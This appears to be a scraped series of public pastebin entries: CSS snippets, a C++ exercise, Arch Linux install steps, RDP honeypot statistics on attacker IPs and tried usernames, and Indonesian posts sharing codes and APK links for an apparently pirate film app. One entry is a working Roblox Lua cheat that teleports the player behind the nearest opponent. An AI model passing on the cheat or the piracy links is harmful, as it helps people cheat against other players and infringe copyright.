        -or -name ""cli.js"" -exec rm '{}' \; \
        -or -name ""cmd.js"" -exec rm '{}' \; \
        -or -name ""coffee"" -prune -exec rm -r '{}' \; \
        -or -name ""example"" -prune -exec rm -r '{}' \; \
        -or -name ""examples"" -prune -exec rm -r '{}' \; \
        -or -name ""gulpfile.js"" -exec rm '{}' \; \
        -or -name ""man"" -prune -exec rm -r '{}' \; \
        -or -name ""obj.target"" -prune -exec rm -r '{}' \; \
        -or -name ""scripts"" -prune -exec rm -r '{}' \; \
        -or -name ""test"" -prune -exec rm -r '{}' \; \
        -or -name ""tests"" -prune -exec rm -r '{}' \;
}
"
Fb2eBz5x,Free 20240516,RizkiKhaizir,CSS,Sunday 19th of May 2024 07:58:26 PM CDT,"<== FilmBluray.iD ==>
Kode Aktif Per 16 Mei 2024

✨ Selalu lakukan Clear Disk Cache aplikasinya sebelum menonton
✨ APK Film Bluray v23.08.01 http://slpre.com/HsQN8 - Mediafire
✨ APK Film Bluray v23.08.01 http://slpre.com/wS1d7 - Telegram
✨ APK Film Bluray v23.08.01 http://slpre.com/l9D3q - PixelDrain

🔈 Dilarang untuk Membongkar kode, nikmati saja apa adanya channel yang ada.
🔈 Kode Ini GRATIS !!! Dilarang memperjual-belikan Kode dan Aplikasi.
🔈 Gunakan dengan bijak aplikasi dan kode ini

KODE VOD Film+Anime : 16045740
WAJIB menggunakan aplikasi Film Bluray v23.08.01 yang bisa didownload pada link di atas. Kode tidak bisa digunakan di aplikasi ZalTV.

⚠️ Kode jangan disebarkan keluar grup, ke facebook atau konten youtube, hargai pembuat kode dan channel.
⚠️ Jika kode kedapatan dishare keluar grup, dijual atau di jadikan konten youtube, maka akan di RESET.

- Terimakasih -"
3Dn9scNN,Pastebin.ai - #1 Pastebin Alternative,xxsa,PHP,Sunday 19th of May 2024 07:56:33 PM CDT,"https://pastebin.ai - #1 Pastebin Alternative - its free and always will be.

pastebin.ai  is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

Simple Ads by Google Adsense Few rather than Pastebin
150+ different syntax languages - All Free
Paste Folders
Load files feature
Password protected pastes.
Encrypted pastes.
URL Shortener.
Unlisted pastes.
Private pastes.
Embed, download, print pastes.
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Encrypted pastes.
Trending pastes page (day, week, month, year).
No Captcha for logged in users feature.
.
.................................
"
HaHy2BYA,2024-05-19_stats.json,rdp_snitch,JSON,Sunday 19th of May 2024 07:18:20 PM CDT,"{
  ""ip"": {
    ""45.227.254.49"": 6,
    ""139.162.55.86"": 6,
    ""91.238.181.71"": 6,
    ""192.241.146.194"": 3,
    ""189.134.126.114"": 6,
    ""50.114.115.64"": 6,
    ""205.210.31.192"": 9,
    ""194.165.16.78"": 12,
    ""172.233.181.79"": 3,
    ""87.251.75.64"": 3,
    ""120.27.142.130"": 3,
    ""136.144.35.206"": 6,
    ""123.56.20.194"": 6,
    ""185.170.144.3"": 6,
    ""87.251.75.120"": 6,
    ""152.32.174.186"": 3,
    ""205.210.31.253"": 9,
    ""46.19.143.42"": 3,
    ""107.167.82.123"": 3,
    ""64.124.50.139"": 6,
    ""194.165.16.11"": 6,
    ""205.210.31.219"": 9,
    ""36.91.222.100"": 6,
    ""45.227.254.55"": 6,
    ""112.4.139.162"": 3,
    ""167.94.138.50"": 3,
    ""116.140.196.215"": 3,
    ""188.216.146.80"": 6,
    ""158.69.238.253"": 3,
    ""198.235.24.79"": 9
  },
  ""asn"": {
    ""AS267784"": 12,
    ""AS63949"": 9,
    ""AS49434"": 6,
    ""AS14061"": 3,
    ""AS8151"": 6,
    ""AS23470"": 6,
    ""AS396982"": 36,
    ""AS48721"": 18,
    ""AS208091"": 9,
    ""AS37963"": 9,
    ""AS396356"": 6,
    ""AS197414"": 6,
    ""AS135377"": 3,
    ""AS51852"": 3,
    ""AS53755"": 3,
    ""AS6461"": 6,
    ""AS7713"": 6,
    ""AS56046"": 3,
    ""AS398324"": 3,
    ""AS4837"": 3,
    ""AS30722"": 6,
    ""AS16276"": 3
  },
  ""isp"": {
    ""Flyservers S.A."": 30,
    ""Akamai Technologies, Inc."": 9,
    ""Datacenter location PAR1 France"": 6,
    ""DigitalOcean, LLC"": 3,
    ""UNINET"": 6,
    ""Ipxo LLC"": 6,
    ""Google LLC"": 36,
    ""Xhost Internet Solutions LP"": 15,
    ""Addresses CNNIC"": 3,
    ""Latitude.sh"": 6,
    ""Hangzhou Alibaba Advertising Co"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Private Layer INC"": 3,
    ""Input Output Flood LLC"": 3,
    ""Zayo Bandwidth"": 6,
    ""PT Telekomunikasi Indonesia"": 6,
    ""China Mobile Communications Corporation"": 3,
    ""Censys, Inc."": 3,
    ""China Unicom CHINA169 Network"": 3,
    ""Vodafone"": 6,
    ""OVH Hosting"": 3
  },
  ""org"": {
    ""UAB Host Baltic"": 12,
    ""Linode, LLC"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""Digital Ocean"": 3,
    ""Gesti\u00f3n de direccionamiento UniNet"": 6,
    ""HOSTING-SOLUTIONS"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""Flyservers S.A"": 18,
    ""Akamai Technologies, Inc."": 3,
    ""Xhost Internet Solutions"": 9,
    ""Aliyun Computing Co., LTD"": 9,
    ""Panq B.V"": 6,
    ""Xhostis"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Client1096"": 3,
    ""DemonVPS"": 3,
    ""Microsoft Corporation"": 6,
    ""Telekomunikasi Indonesia"": 6,
    ""China Mobile Communications Corporation"": 3,
    ""Censys, Inc"": 3,
    ""China United Network Communications Corporation Limited"": 3,
    ""Unknown"": 6,
    ""Peng Chiang, Yu"": 3
  },
  ""regionName"": {
    ""Vilnius"": 12,
    ""North West"": 6,
    ""\u00cele-de-France"": 6,
    ""New Jersey"": 15,
    ""Hidalgo"": 6,
    ""California"": 36,
    ""Kaunas"": 18,
    ""Florida"": 3,
    ""North Holland"": 15,
    ""Zhejiang"": 3,
    ""Beijing"": 9,
    ""Kowloon"": 3,
    ""Zurich"": 3,
    ""Arizona"": 3,
    ""Virginia"": 6,
    ""Jakarta"": 6,
    ""Jiangsu"": 3,
    ""Michigan"": 3,
    ""Friuli Venezia Giulia"": 6,
    ""Quebec"": 3
  },
  ""country"": {
    ""Lithuania"": 30,
    ""Singapore"": 6,
    ""France"": 6,
    ""United States"": 66,
    ""Mexico"": 6,
    ""The Netherlands"": 15,
    ""China"": 15,
    ""Hong Kong"": 3,
    ""Switzerland"": 3,
    ""Indonesia"": 6,
    ""Italy"": 6,
    ""Canada"": 3
  },
  ""account"": {
    ""Test"": 54,
    ""hello"": 39,
    ""KvruLtQAW"": 3,
    ""QehZRG"": 3,
    ""jCTnrp"": 3,
    ""Administr"": 18,
    ""(empty)"": 15,
    ""Administrator"": 3,
    ""OIrwnAVkJ"": 3,
    ""aXCSEW"": 3,
    ""rpMObH"": 3,
    ""GwPyBuJpA"": 3,
    ""TpkvGW"": 3,
    ""twCAEo"": 3,
    ""cskTAmgqz"": 3,
    ""xuUYSG"": 3,
    ""QJYgnp"": 3
  },
  ""keyboard"": {
    ""Unknown"": 165
  },
  ""client_build"": {
    ""Unknown"": 165
  },
  ""client_name"": {
    ""Unknown"": 165
  },
  ""ip_type"": {
    ""Unknown"": 75,
    ""hosting"": 81,
    ""proxy"": 6,
    ""mobile"": 3
  }
}"
aMyma0GP,2024-05-19_stats.json,rdp_snitch,JSON,Sunday 19th of May 2024 07:16:07 PM CDT,"{
  ""ip"": {
    ""45.227.254.49"": 4,
    ""139.162.55.86"": 4,
    ""91.238.181.71"": 4,
    ""192.241.146.194"": 2,
    ""189.134.126.114"": 4,
    ""50.114.115.64"": 4,
    ""205.210.31.192"": 6,
    ""194.165.16.78"": 8,
    ""172.233.181.79"": 2,
    ""87.251.75.64"": 2,
    ""120.27.142.130"": 2,
    ""136.144.35.206"": 4,
    ""123.56.20.194"": 4,
    ""185.170.144.3"": 4,
    ""87.251.75.120"": 4,
    ""152.32.174.186"": 2,
    ""205.210.31.253"": 6,
    ""46.19.143.42"": 2,
    ""107.167.82.123"": 2,
    ""64.124.50.139"": 4,
    ""194.165.16.11"": 4,
    ""205.210.31.219"": 6,
    ""36.91.222.100"": 4,
    ""45.227.254.55"": 4,
    ""112.4.139.162"": 2,
    ""167.94.138.50"": 2,
    ""116.140.196.215"": 2,
    ""188.216.146.80"": 4,
    ""158.69.238.253"": 2,
    ""198.235.24.79"": 6
  },
  ""asn"": {
    ""AS267784"": 8,
    ""AS63949"": 6,
    ""AS49434"": 4,
    ""AS14061"": 2,
    ""AS8151"": 4,
    ""AS23470"": 4,
    ""AS396982"": 24,
    ""AS48721"": 12,
    ""AS208091"": 6,
    ""AS37963"": 6,
    ""AS396356"": 4,
    ""AS197414"": 4,
    ""AS135377"": 2,
    ""AS51852"": 2,
    ""AS53755"": 2,
    ""AS6461"": 4,
    ""AS7713"": 4,
    ""AS56046"": 2,
    ""AS398324"": 2,
    ""AS4837"": 2,
    ""AS30722"": 4,
    ""AS16276"": 2
  },
  ""isp"": {
    ""Flyservers S.A."": 20,
    ""Akamai Technologies, Inc."": 6,
    ""Datacenter location PAR1 France"": 4,
    ""DigitalOcean, LLC"": 2,
    ""UNINET"": 4,
    ""Ipxo LLC"": 4,
    ""Google LLC"": 24,
    ""Xhost Internet Solutions LP"": 10,
    ""Addresses CNNIC"": 2,
    ""Latitude.sh"": 4,
    ""Hangzhou Alibaba Advertising Co"": 4,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Private Layer INC"": 2,
    ""Input Output Flood LLC"": 2,
    ""Zayo Bandwidth"": 4,
    ""PT Telekomunikasi Indonesia"": 4,
    ""China Mobile Communications Corporation"": 2,
    ""Censys, Inc."": 2,
    ""China Unicom CHINA169 Network"": 2,
    ""Vodafone"": 4,
    ""OVH Hosting"": 2
  },
  ""org"": {
    ""UAB Host Baltic"": 8,
    ""Linode, LLC"": 4,
    ""ThinkTech Technology Industrial CO. Limited"": 4,
    ""Digital Ocean"": 2,
    ""Gesti\u00f3n de direccionamiento UniNet"": 4,
    ""HOSTING-SOLUTIONS"": 4,
    ""Palo Alto Networks, Inc"": 24,
    ""Flyservers S.A"": 12,
    ""Akamai Technologies, Inc."": 2,
    ""Xhost Internet Solutions"": 6,
    ""Aliyun Computing Co., LTD"": 6,
    ""Panq B.V"": 4,
    ""Xhostis"": 4,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Client1096"": 2,
    ""DemonVPS"": 2,
    ""Microsoft Corporation"": 4,
    ""Telekomunikasi Indonesia"": 4,
    ""China Mobile Communications Corporation"": 2,
    ""Censys, Inc"": 2,
    ""China United Network Communications Corporation Limited"": 2,
    ""Unknown"": 4,
    ""Peng Chiang, Yu"": 2
  },
  ""regionName"": {
    ""Vilnius"": 8,
    ""North West"": 4,
    ""\u00cele-de-France"": 4,
    ""New Jersey"": 10,
    ""Hidalgo"": 4,
    ""California"": 24,
    ""Kaunas"": 12,
    ""Florida"": 2,
    ""North Holland"": 10,
    ""Zhejiang"": 2,
    ""Beijing"": 6,
    ""Kowloon"": 2,
    ""Zurich"": 2,
    ""Arizona"": 2,
    ""Virginia"": 4,
    ""Jakarta"": 4,
    ""Jiangsu"": 2,
    ""Michigan"": 2,
    ""Friuli Venezia Giulia"": 4,
    ""Quebec"": 2
  },
  ""country"": {
    ""Lithuania"": 20,
    ""Singapore"": 4,
    ""France"": 4,
    ""United States"": 44,
    ""Mexico"": 4,
    ""The Netherlands"": 10,
    ""China"": 10,
    ""Hong Kong"": 2,
    ""Switzerland"": 2,
    ""Indonesia"": 4,
    ""Italy"": 4,
    ""Canada"": 2
  },
  ""account"": {
    ""Test"": 36,
    ""hello"": 26,
    ""KvruLtQAW"": 2,
    ""QehZRG"": 2,
    ""jCTnrp"": 2,
    ""Administr"": 12,
    ""(empty)"": 10,
    ""Administrator"": 2,
    ""OIrwnAVkJ"": 2,
    ""aXCSEW"": 2,
    ""rpMObH"": 2,
    ""GwPyBuJpA"": 2,
    ""TpkvGW"": 2,
    ""twCAEo"": 2,
    ""cskTAmgqz"": 2,
    ""xuUYSG"": 2,
    ""QJYgnp"": 2
  },
  ""keyboard"": {
    ""Unknown"": 110
  },
  ""client_build"": {
    ""Unknown"": 110
  },
  ""client_name"": {
    ""Unknown"": 110
  },
  ""ip_type"": {
    ""Unknown"": 50,
    ""hosting"": 54,
    ""proxy"": 4,
    ""mobile"": 2
  }
}"
FW8GSzbS,MT backup before upgrade 5/19/24,coffeeandphotos,CSS,Sunday 19th of May 2024 07:15:11 PM CDT,"//custom nav
section[id*=""nav""] {

  background-color:#00a2dd;

  .Index-page-content {
    padding:10px 10px;
    max-width:900px;
    margin:auto;
  }
  .sqs-block {
    padding-bottom:0px;
  }
  
  p {
    color:white;
  }
  @media (max-width:960px) {
  display:none;
 }
}
.Index-page-content {
margin-top:0px !important;
}

//moveable blocks
#moveable {
.sqs-gallery-block-grid .slide .margin-wrapper a.image-slide-anchor img:hover {
   z-index:999999 !important;
}

.sqs-gallery-block-grid .slide .margin-wrapper a.image-slide-anchor img {
  width:100% !important;
}
img {
    width: 100% !important;
    height: auto !important;
    cursor: move !important;
}

.sqs-gallery-design-grid-slide:nth-child(odd) {
  margin-top:-50px !important;//adjust as needed
  margin-left:-2vw !important; //adjust as needed
}


 .sqs-gallery-design-grid-slide:nth-child(even) {
  margin-top:40px; //adjust as needed

  margin-right:-2vw !important; //adjust as needed
}
.sqs-gallery-block-grid {
overflow:visible !important;
}

}
//moveable adjust margins
@media screen and (min-width:960px) {
#block-yui_3_17_2_1_1595210178473_4743 {
margin-left:100px;
}
}
//moveable mobile size
#moveable {

@media screen and (max-width:640px) {
  .slide {
    width:22% !important;
  }
}
}
/* show home page block dependent on screen size */ 
@media only screen and (max-width: 780px) { #services-desktop { display: none; } } 
@media only screen and (min-width: 781px) { #services-mobile { display: none!important; } }

//mobile 

.Mobile-overlay-nav-item {  
    text-align: center;
}

.Mobile-overlay-menu {
    background-image: url(https://static1.squarespace.com/static/5f1138310f6d242673f0c0b6/t/5f152db97423410cc7ddfd11/1595223481898/champagne-beach-wood-lifeproof-vinyl-plank-flooring-i4445101lc-64_1000.jpghttps://static1.squarespace.com/static/5d1d694fef1a470001949e99/t/5d1e7784ae39c800014ed07e/1562277769083/Squarestylist-jfk-mobile-background.png);
    background-color: #fff;
    background-position: center;
    background-repeat: no-repeat;
    background-size: cover;
    width: 100vw !important;
}

.Mobile-overlay-close {
    z-index: 999;
background:transparent !important;
}

.Mobile-overlay-nav--primary {
padding-top:100px;
}



//hide bottom footer
  #footerBlocksBottom {

 display: none !important;

 }

//no auto hyphens
p, h1, h2, h3 {hyphens: manual !important; -webkit-hyphens: manual !important; -moz-hyphens: manual !important; -ms-hyphens: manual !important; }

.tweak-mobile-overlay-menu-secondary-style-button:not(.tweak-mobile-overlay-menu-secondary-inherit) .Mobile-overlay-nav--secondary .Mobile-overlay-nav-item {
display:block;
margin: 75px !important;
width: max-content !important;
padding: 12px 20px !important;
}"
AqTHLfbA,2024-05-19_stats.json,rdp_snitch,JSON,Sunday 19th of May 2024 07:15:08 PM CDT,"{
  ""ip"": {
    ""45.227.254.49"": 2,
    ""139.162.55.86"": 2,
    ""91.238.181.71"": 2,
    ""192.241.146.194"": 1,
    ""189.134.126.114"": 2,
    ""50.114.115.64"": 2,
    ""205.210.31.192"": 3,
    ""194.165.16.78"": 4,
    ""172.233.181.79"": 1,
    ""87.251.75.64"": 1,
    ""120.27.142.130"": 1,
    ""136.144.35.206"": 2,
    ""123.56.20.194"": 2,
    ""185.170.144.3"": 2,
    ""87.251.75.120"": 2,
    ""152.32.174.186"": 1,
    ""205.210.31.253"": 3,
    ""46.19.143.42"": 1,
    ""107.167.82.123"": 1,
    ""64.124.50.139"": 2,
    ""194.165.16.11"": 2,
    ""205.210.31.219"": 3,
    ""36.91.222.100"": 2,
    ""45.227.254.55"": 2,
    ""112.4.139.162"": 1,
    ""167.94.138.50"": 1,
    ""116.140.196.215"": 1,
    ""188.216.146.80"": 2,
    ""158.69.238.253"": 1,
    ""198.235.24.79"": 3
  },
  ""asn"": {
    ""AS267784"": 4,
    ""AS63949"": 3,
    ""AS49434"": 2,
    ""AS14061"": 1,
    ""AS8151"": 2,
    ""AS23470"": 2,
    ""AS396982"": 12,
    ""AS48721"": 6,
    ""AS208091"": 3,
    ""AS37963"": 3,
    ""AS396356"": 2,
    ""AS197414"": 2,
    ""AS135377"": 1,
    ""AS51852"": 1,
    ""AS53755"": 1,
    ""AS6461"": 2,
    ""AS7713"": 2,
    ""AS56046"": 1,
    ""AS398324"": 1,
    ""AS4837"": 1,
    ""AS30722"": 2,
    ""AS16276"": 1
  },
  ""isp"": {
    ""Flyservers S.A."": 10,
    ""Akamai Technologies, Inc."": 3,
    ""Datacenter location PAR1 France"": 2,
    ""DigitalOcean, LLC"": 1,
    ""UNINET"": 2,
    ""Ipxo LLC"": 2,
    ""Google LLC"": 12,
    ""Xhost Internet Solutions LP"": 5,
    ""Addresses CNNIC"": 1,
    ""Latitude.sh"": 2,
    ""Hangzhou Alibaba Advertising Co"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Private Layer INC"": 1,
    ""Input Output Flood LLC"": 1,
    ""Zayo Bandwidth"": 2,
    ""PT Telekomunikasi Indonesia"": 2,
    ""China Mobile Communications Corporation"": 1,
    ""Censys, Inc."": 1,
    ""China Unicom CHINA169 Network"": 1,
    ""Vodafone"": 2,
    ""OVH Hosting"": 1
  },
  ""org"": {
    ""UAB Host Baltic"": 4,
    ""Linode, LLC"": 2,
    ""ThinkTech Technology Industrial CO. Limited"": 2,
    ""Digital Ocean"": 1,
    ""Gesti\u00f3n de direccionamiento UniNet"": 2,
    ""HOSTING-SOLUTIONS"": 2,
    ""Palo Alto Networks, Inc"": 12,
    ""Flyservers S.A"": 6,
    ""Akamai Technologies, Inc."": 1,
    ""Xhost Internet Solutions"": 3,
    ""Aliyun Computing Co., LTD"": 3,
    ""Panq B.V"": 2,
    ""Xhostis"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Client1096"": 1,
    ""DemonVPS"": 1,
    ""Microsoft Corporation"": 2,
    ""Telekomunikasi Indonesia"": 2,
    ""China Mobile Communications Corporation"": 1,
    ""Censys, Inc"": 1,
    ""China United Network Communications Corporation Limited"": 1,
    ""Unknown"": 2,
    ""Peng Chiang, Yu"": 1
  },
  ""regionName"": {
    ""Vilnius"": 4,
    ""North West"": 2,
    ""\u00cele-de-France"": 2,
    ""New Jersey"": 5,
    ""Hidalgo"": 2,
    ""California"": 12,
    ""Kaunas"": 6,
    ""Florida"": 1,
    ""North Holland"": 5,
    ""Zhejiang"": 1,
    ""Beijing"": 3,
    ""Kowloon"": 1,
    ""Zurich"": 1,
    ""Arizona"": 1,
    ""Virginia"": 2,
    ""Jakarta"": 2,
    ""Jiangsu"": 1,
    ""Michigan"": 1,
    ""Friuli Venezia Giulia"": 2,
    ""Quebec"": 1
  },
  ""country"": {
    ""Lithuania"": 10,
    ""Singapore"": 2,
    ""France"": 2,
    ""United States"": 22,
    ""Mexico"": 2,
    ""The Netherlands"": 5,
    ""China"": 5,
    ""Hong Kong"": 1,
    ""Switzerland"": 1,
    ""Indonesia"": 2,
    ""Italy"": 2,
    ""Canada"": 1
  },
  ""account"": {
    ""Test"": 18,
    ""hello"": 13,
    ""KvruLtQAW"": 1,
    ""QehZRG"": 1,
    ""jCTnrp"": 1,
    ""Administr"": 6,
    ""(empty)"": 5,
    ""Administrator"": 1,
    ""OIrwnAVkJ"": 1,
    ""aXCSEW"": 1,
    ""rpMObH"": 1,
    ""GwPyBuJpA"": 1,
    ""TpkvGW"": 1,
    ""twCAEo"": 1,
    ""cskTAmgqz"": 1,
    ""xuUYSG"": 1,
    ""QJYgnp"": 1
  },
  ""keyboard"": {
    ""Unknown"": 55
  },
  ""client_build"": {
    ""Unknown"": 55
  },
  ""client_name"": {
    ""Unknown"": 55
  },
  ""ip_type"": {
    ""Unknown"": 25,
    ""hosting"": 27,
    ""proxy"": 2,
    ""mobile"": 1
  }
}"
V5nV33Wk,ee,nooblollolololol,Lua,Sunday 19th of May 2024 07:11:17 PM CDT,"local Players = game:GetService(""Players"")
local RunService = game:GetService(""RunService"")
local UserInputService = game:GetService(""UserInputService"")
local localPlayer = Players.LocalPlayer

local tpAuraEnabled = false
local interval = 1
local setBackTime = 0

local wasTpAuraEnabledBeforeDeath = false

local function isPlayerAlive(player)
	if player.Character and player.Character:FindFirstChild(""HumanoidRootPart"") and player.Character:FindFirstChild(""Humanoid"") then
		return player.Character.Humanoid.Health > 0
	end
	return false
end

local function getNearestPlayer()
	local nearestPlayer = nil
	local shortestDistance = math.huge

	for _, player in pairs(Players:GetPlayers()) do
		if player ~= localPlayer and isPlayerAlive(player) then
			local distance = (localPlayer.Character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
			if distance < shortestDistance then
				shortestDistance = distance
				nearestPlayer = player
			end
		end
	end

	return nearestPlayer
end

local function tpAura()
	if not tpAuraEnabled or not isPlayerAlive(localPlayer) then return end

	local humanoidRootPart = localPlayer.Character:WaitForChild(""HumanoidRootPart"")
	local savedPosition = humanoidRootPart.Position
	local savedCFrame = humanoidRootPart.CFrame

	local nearestPlayer = getNearestPlayer()
	if nearestPlayer and nearestPlayer.Character and nearestPlayer.Character:FindFirstChild(""HumanoidRootPart"") then
		local targetPosition = nearestPlayer.Character.HumanoidRootPart.Position
		local direction = (targetPosition - humanoidRootPart.Position).unit
		local backPosition = targetPosition - direction * 2

		humanoidRootPart.CFrame = CFrame.new(backPosition, targetPosition)

		task.wait(setBackTime)

		humanoidRootPart.CFrame = savedCFrame
	end
end

local function toggleTpAura()
	tpAuraEnabled = not tpAuraEnabled
	if tpAuraEnabled then
		while tpAuraEnabled and isPlayerAlive(localPlayer) do
			tpAura()
			task.wait(interval)
		end
	end
end

local function onPlayerDied()
	print(""Player has died!"")
	wasTpAuraEnabledBeforeDeath = tpAuraEnabled
	tpAuraEnabled = false
end

local function onCharacterAdded(character)
	print(""Character added or respawned!"")
	local humanoid = character:WaitForChild(""Humanoid"")
	local humanoidRootPart = character:WaitForChild(""HumanoidRootPart"")

	humanoid.Died:Connect(onPlayerDied)

	task.wait(0.1)
	if wasTpAuraEnabledBeforeDeath then
		toggleTpAura()
	end
end

localPlayer.CharacterAdded:Connect(onCharacterAdded)

UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
	if gameProcessedEvent then return end

	if input.KeyCode == Enum.KeyCode.M then
		toggleTpAura()
	end
end)

if localPlayer.Character then
	onCharacterAdded(localPlayer.Character)
else
	localPlayer.CharacterAdded:Wait()
end
"
aQt8ssBe,СПРИНТ № 7 | Односвязный список | Урок 7: Работаем с массивами,chevengur,C++,Sunday 19th of May 2024 06:59:46 PM CDT,"#include <cassert>
#include <vector>
#include <iterator>
#include <iostream>
#include <algorithm>

template <typename T>
void ReverseArray(T* start, size_t size) {
    std::reverse(start, start + size);
}

int main() {
    using namespace std;

    vector<int> v = {1, 2};
    ReverseArray(v.data(), v.size());
    assert(v == (vector<int>{2, 1}));
}"
qUn8bnNW,Pastebin.ai - #1 Pastebin Alternative,xxsa,PHP,Sunday 19th of May 2024 04:22:50 PM CDT,"https://pastebin.ai - #1 Pastebin Alternative - its free and always will be.

pastebin.ai  is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

Simple Ads by Google Adsense Few rather than Pastebin
150+ different syntax languages - All Free
Paste Folders
Load files feature
Password protected pastes.
Encrypted pastes.
URL Shortener.
Unlisted pastes.
Private pastes.
Embed, download, print pastes.
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Encrypted pastes.
Trending pastes page (day, week, month, year).
No Captcha for logged in users feature.
.
................................
"
TmehX1Y3,Untitled,gxldxm689171,Bash,Sunday 19th of May 2024 04:14:34 PM CDT,"# montar las particioens
mkswap /dev/sda2                  # Para swap
swapon /dev/sda2                  # Activar swap
mount /dev/sda3 /mnt              # Montar root
mkdir /mnt/boot              # Crear carpeta EFI
mount /dev/sda1 /mnt/boot     # Montar EFI
mkdir /mnt/etc
genfstab -U /mnt >> /mnt/etc/fstab # crear archivo fstab
pacstrap /mnt base linux linux-firmware vim sudo networkmanager base-devel #wpa_supplicant

arch-chroot /mnt"
sx3vNmBb,Work Skin Ama,Kaanbaltlak,CSS,Sunday 19th of May 2024 04:09:35 PM CDT,"#workskin #workskin h2.title.heading {
  color: #410000;
}

#workskin img {
  max-width: 100%;
  height: auto;
  -webkit-border-radius: 3px;
  border-radius: 3px;
  border: 0;
}

/* Esto modifica el borde solido de la zona de la descripción y notas */
#workskin .preface.group {
  padding: 20px;
  -webkit-border-radius: 5px;
  border-radius: 5px;
  border: 2px solid #edf5f3;
  -webkit-box-shadow: 0 2px 3px 0 #ccc;
  box-shadow: 0 2px 3px 0 #ccc;
}

/* Esto modifica el ""Notes:"" */
#workskin .preface.group div h3 {
  border: none;
  font-weight: 400;
  font-family: arial,helvetica,sans-serif;
  color: #e0b834;
  text-transform: uppercase;
  font-size: 16px;
  letter-spacing: 3px;
}

#workskin .preface.group h3.byline.heading {
  font-family: 'Lucida Grande','Lucida Sans Unicode','GNU Unifont',Verdana,Helvetica,sans-serif;
  font-style: normal;
}

/* Aquí empieza el bloque de cita*/
#workskin .userstuff blockquote {
  border: 0;
}

#workskin .userstuff blockquote {
  margin: 0;
  border-inline-start: 2px solid #e0b834;
}

#workskin .userstuff blockquote p {
  padding: 15px;
  background: #e0b834;
  border-radius: 5px;
  color: black;
}

#workskin .userstuff blockquote p::before {
  content: '\201C';
}

#workskin .userstuff blockquote p::after {
  content: '\201D';
}
/* Aquí termina el bloque de cita */

/* Esto cambia el nombre de autor */
#workskin .preface.group h3.byline.heading a {
  color: #e0b834;
  display: block;
  margin-bottom: 30px;
  text-transform: uppercase;
  font-size: 13px;
  letter-spacing: 3px;
}

/* Esto cambia el color de los enlaces en texto */
#workskin .preface.group a {
  text-decoration: none;
}

#workskin .link {
  color: #e0b834;
}

#workskin a:link {
  color: #e0b834;
  font-family: 'Lucida Grande','Lucida Sans Unicode','GNU Unifont',Verdana,Helvetica,sans-serif;
}

#workskin a:visited {
  color: #e0a434;
}

#workskin a:hover {
  color: #e0a434;
  font-weight: bold;
}

#workskin a:active {
  color: #e0b834;
}

#workskin ul li::marker {
  color: #e0b834;
}

#workskin p.image,
#workskin p.image img {
  padding: 0px;
  margin-block-end: 0px;
  margin-block-start: 0px;
  line-height: 0px;
}

#workskin p.image {
  margin: 0px auto;
}

#workskin p.image img {
  margin: 0px !important;
}
"
